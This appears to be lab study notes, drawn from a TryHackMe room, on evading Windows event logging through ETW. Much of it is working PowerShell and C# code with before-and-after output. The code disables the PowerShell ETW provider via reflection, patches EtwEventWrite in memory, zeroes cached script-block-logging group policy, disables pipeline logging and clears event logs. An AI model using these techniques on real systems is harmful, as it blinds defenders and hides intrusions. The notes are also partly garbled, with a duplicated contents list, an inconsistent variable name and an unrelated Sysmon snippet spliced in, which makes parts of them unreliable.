## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [Approaches to Log Evasion](#approaches\to\log\evasion)
- [Tracing Instrumentation](#tracing\instrumentation)
- [Reflection for Fun and Silence](#reflection\for\fun\and\silence)
- [Group Policy Takeover](#group\policy\takeover)
- [Abusing Log Pipeline](#abusing\log\pipeline)

## Table of Contents

- [Approaches to Log Evasion](#approaches\to\log\evasion)
- [Tracing Instrumentation](#tracing\instrumentation)
- [Reflection for Fun and Silence](#reflection\for\fun\and\silence)
- [Group Policy Takeover](#group\policy\takeover)
- [Abusing Log Pipeline](#abusing\log\pipeline)


As previously mentioned, almost all event logging capability within Windows is handled from ETW at both the application and kernel level. While there are other services in place like _Event Logging_ and _Trace Logging,_ these are either extensions of ETW or less prevalent to attackers.

|   |   |
|---|---|
|**Component**|**Purpose**|
|Controllers|Build and configure sessions|
|Providers|Generate events|
|Consumers|Interpret events|


# Approaches to Log Evasion

|   |   |
|---|---|
|**Event ID**|**Purpose**|
|1102|Logs when the Windows Security audit log was cleared|
|104|Logs when the log file was cleared|
|1100|Logs when the Windows Event Log service was shut down|


# Tracing Instrumentation

ETW is broken up into three separate components, working together to manage and correlate data. Event logs in Windows are no different from generic XML data, making it easy to process and interpret.

Event Controllers are used to build and configure sessions. To expand on this definition, we can think of the controller as the application that determines how and where data will flow. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers), “Controllers are applications that define the size and location of the log file, start and stop event tracing sessions, enable providers so they can log events to the session, manage the size of the buffer pool, and obtain execution statistics for sessions.”

Event Providers are used to generate events. To expand on this definition, the controller will tell the provider how to operate, then collect logs from its designated source. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers), “Providers are applications that contain event tracing instrumentation. After a provider registers itself, a controller can then enable or disable event tracing in the provider. The provider defines its interpretation of being enabled or disabled. Generally, an enabled provider generates events, while a disabled provider does not.”

There are also four different types of providers with support for various functions and legacy systems.

|   |   |
|---|---|
|**Provider**|**Purpose**|
|MOF (Managed Object Format)|Defines events from MOF classes. Enabled by one trace session at a time.|
|WPP (Windows Software Trace Preprocessor)|Associated with [TMF](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[(](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[T](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[race](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) [M](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[essage](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) [F](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file)[ormat)](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) files to decode information. Enabled by one trace session at a time.|
|Manifest-Based|Defines events from a manifest. Enabled by up to eight trace sessions at a time.|
|TraceLogging|Self-describing events containing all required information. Enabled by up to eight trace sessions at a time.|


Each of these components can be brought together to fully understand and depict the data/session flow within ETW.

![Diagram depicting the interaction between ETW components, verbally described in the paragraph below](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dc8217f5aecbcc08d609c3299756da08.png)  

From start to finish, events originate from the providers. Controllers will determine where the data is sent and how it is processed through sessions. Consumers will save or deliver logs to be interpreted or analyzed.

Now that we understand how ETW is instrumented, how does this apply to attackers? We previously mentioned the goal of limiting visibility while maintaining integrity. We can limit a specific aspect of insight by targeting components while maintaining most of the data flow. Below is a brief list of specific techniques that target each ETW component.

|   |   |
|---|---|
|**Component  <br>**|**Techniques**|
|Provider|PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation|
|Controller|Patching EtwEventWrite, Runtime Tracing Tampering,|
|Consumers|Log Smashing, Log Tampering|

We will cover each of these techniques in-depth in the upcoming tasks to provide a large toolbox of possibilities.


# Reflection for Fun and Silence
Within Powershell, 

In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup. Since the session has the same privilege level as the loaded assemblies, we can modify the assembly fields and values through PowerShell reflection. From [O'Reilly](https://www.oreilly.com/library/view/professional-windows-powershell/9780471946939/9780471946939_using_.net_reflection.html) , "Reflection allows you to look inside an assembly and find out its characteristics. Inside a .NET assembly, information is stored that describes what the assembly contains. This is called metadata. A .NET assembly is, in a sense, self-describing, at least if interrogated correctly."

In the context of **ETW** (**E**vent **T**racing for **W**indows), an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`


At a high level, PowerShell reflection can be broken up into four steps:

1. Obtain .NET assembly for `PSEtwLogProvider`.
2. Store a null value for `etwProvider` field.
3. Set the field for `m_enabled` to previously stored value.

At step one, we need to obtain the type for the `PSEtwLogProvider` assembly. The assembly is stored in order to access its internal fields in the next step.
```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

At step two, we are storing a value ($null) from the previous assembly to be used.  

```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

At step three, we compile our steps together to overwrite the `m_enabled` field with the value stored in the previous line.

```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.

To prove the efficacy of the script, we can execute it and measure the number of returned events from a given command.

[Before]
```powershell
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
7
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
11
```
[After]
```powershell
PS C:\Users\Administrator>.\reflection.ps1 

PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count 18 

PS C:\Users\Administrator> whoami 
Tryhackme\administrator 

PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count 18

```


At a high level, ETW patching can be broken up into five steps:

1. Obtain a handle for `EtwEventWrite`
2. Modify memory permissions of the function
3. Write opcode bytes to memory
4. Reset memory permissions of the function (optional)
5. Flush the instruction cache (optional)

At step one, we need to obtain a handle for the address of `EtwEventWrite`. This function is stored within `ntdll`. We will first load the library using `LoadLibrary` then obtain the handle using `GetProcAddress`.

```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

At step two, we need to modify the memory permissions of the function to allow us to write to the function. The permission of the function is defined by the `flNewProtect` parameter; `0x40` enables X, R, or RW access ([memory protection constraints](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)).

```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```


At step three, the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. Because we are writing to a function and not a process, we can use the infamous `Marshal.Copy` to write our opcode.

```csharp
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```

At step four, we can begin cleaning our steps to restore memory permissions as they were.

```csharp
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
```

At step five, we can ensure the patched function will be executed from the instruction cache.

```csharp
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

We can compile these steps together and append them to a malicious script or session. Use the C# script provided and experiment with this technique.

After the opcode is written to memory, we can view the disassembled function again to observe the patch.

```wasm
779f23c0 c21400		    ret	14h
779f23c3 00ec		      add	ah, ch
779f23c5 83e4f8		    and	esp, 0FFFFFFF8h
779f23c8 81ece0000000	sub	esp, 0E0h
```

In the above disassembly, we see exactly what we depicted in our LIFO diagram (figure 2).  

Once the function is patched in memory, it will always return when `EtwEventWrite` is called.

Although this is a beautifully crafted technique, it might not be the best approach depending on your environment since it may restrict more logs than you want for integrity.

Script block logging will log any script blocks executed within a PowerShell session. Introduced in PowerShell v4 and improved in PowerShell v5, the ETW provider has two event IDs it will report.

|   |   |
|---|---|
|**Event ID**|**Purpose**|
|4103|Logs command invocation|
|4104|Logs script block execution|


# Group Policy Takeover

The module logging and script block logging providers are both enabled from a group policy, specifically `Administrative Templates -> Windows Components -> Windows PowerShell`. As mentioned in task 4, Within a PowerShell session, system assemblies are loaded in the same security context as users. This means an attacker has the same privilege level as the assemblies that cache GPO settings. Using reflection, an attacker can obtain the utility dictionary and modify the group policy for either PowerShell provider.

At a high-level a group policy takeover can be broken up into three steps:

1. Obtain group policy settings from the utility cache.
2. Modify generic provider to `0`.
3. Modify the invocation or module definition.

At step one, we must use reflection to obtain the type of `System.Management.Automation.Utils` and identify the GPO cache field: `cachedGroupPolicySettings`.

```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```

At step two, we can leverage the GPO variable to modify either event provider setting to `0`. `EnableScriptBlockLogging` will control **4104** events, limiting the visibility of script execution. Modification can be accomplished by writing to the object or registry directly.

```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

At step three, we can repeat the previous step with any other provider settings we want to `EnableScriptBlockInvocationLogging` will control **4103** events, limiting the visibility of cmdlet and pipeline execution.

```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.
[Before]
```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count 0 

PS C:\Users\Administrator\Desktop> whoami Tryhackme\administrator 

PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count 3```

```powershell
  
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444' 

ProviderName: Microsoft-Windows-Sysmon TimeCreated Id LevelDisplayName Message ----------- -- ---------------- ------- 1/5/2021 2:21:32 AM 3 Information Network connection detected:...
```

# Abusing Log Pipeline

rom the [Microsoft docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events), “When the _LogPipelineExecutionDetails_ property value is TRUE (`$true`), Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer.” An attacker can change this value to `$false` in any PowerShell session to disable a module logging for that specific session. The Microsoft docs even note the ability to disable logging from a user session, “To disable logging, use the same command sequence to set the property value to FALSE (`$false`).”

At a high-level the log pipeline technique can be broken up into four steps:

1. Obtain the target module.
2. Set module execution details to `$false`.
3. Obtain the module snap-in.
4. Set snap-in execution details to `$false`.


```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```


The script block above can be appended to any PowerShell script or run in a session to disable module logging of currently imported modules.

 To remove the logs, we can use the _Event Viewer_ GUI or _Remove-EventLog_ in PowerShell. PowerShell script block logs are located in _Microsoft/Windows/PowerShell/Operational_ or _Microsoft-Windows-PowerShell._ You can then select _Clear Log_ under actions in the GUI or run the PowerShell cmdlet to remove the necessary logs.